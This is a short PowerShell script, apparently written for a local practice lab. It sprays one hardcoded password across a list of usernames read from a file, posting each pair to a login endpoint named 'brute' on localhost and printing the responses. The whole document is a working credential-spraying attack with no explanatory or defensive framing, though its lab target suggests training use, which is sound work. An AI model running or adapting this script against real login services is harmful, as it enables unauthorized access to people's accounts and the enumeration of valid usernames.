$Url = "http://localhost:3000/api/v1/brute/login"
$Password = "eiV~Hhm5ss"


$Usernames = Get-Content -Path "username.txt"


$Counter = 1


foreach ($UsernameRaw in $Usernames) {
    $Username = $UsernameRaw.Trim()
 
    $Body = @{
        username = $Username
        password = $Password
    } | ConvertTo-Json -Compress

    
    $Headers = @{
        "Content-Type" = "application/json"
    }

    Write-Host "`n[$Counter] Trying: $Username"

    
    try {
        $Response = Invoke-RestMethod -Uri $Url -Method Post -Body $Body -Headers $Headers
        Write-Host "[$Counter] Response:"
        $Response | ConvertTo-Json -Depth 5 | Write-Host
    } catch {
        Write-Host "[$Counter] Error: $($_.Exception.Message)"
    }

    $Counter++
}
